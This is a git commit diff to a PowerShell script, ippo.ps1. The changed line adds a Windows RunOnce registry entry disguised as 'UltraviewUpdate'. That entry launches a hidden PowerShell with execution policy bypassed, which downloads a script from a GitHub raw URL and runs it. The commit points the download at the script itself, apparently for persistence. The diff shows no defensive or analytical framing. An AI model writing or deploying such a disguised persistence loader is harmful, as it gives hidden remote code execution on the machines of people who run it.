49ba65b5d6f0322a05c4bd5acc055bb279fec506
jia891 <phamly2tb@gmail.com>
2026-03-18 19:36:35 -0700

    Update ippo.ps1

--- ippo.ps1
+++ ippo.ps1
@@ -1,4 +1,4 @@
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/ok/refs/heads/main/install.ps1'' | iex"' -Type String -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/ok/refs/heads/main/ippo.ps1'' | iex"' -Type String -Force
 
 for ($i = 1; $i -le 6; $i++) {
    
